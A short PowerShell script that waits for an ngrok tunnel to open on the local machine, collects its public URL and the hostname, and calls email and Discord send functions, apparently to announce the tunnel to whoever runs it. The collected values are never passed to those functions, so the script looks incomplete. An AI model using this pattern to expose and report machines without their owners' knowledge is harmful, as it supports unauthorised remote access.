Import-Module ".\send-email.psm1" -DisableNameChecking

$stat = $true
while($stat){
	$tunnel = Invoke-WebRequest -Uri "http://localhost:4040/api/tunnels" -UseBasicParsing | ConvertFrom-Json
	$port = $tunnel[0].tunnels.public_url
	if($port -like "*.ngrok*"){
		$stat = $false
	} else {
		Start-Sleep 10
	}
}

$pcname=HOSTNAME.EXE

Send-Email 
Send-Discord
    

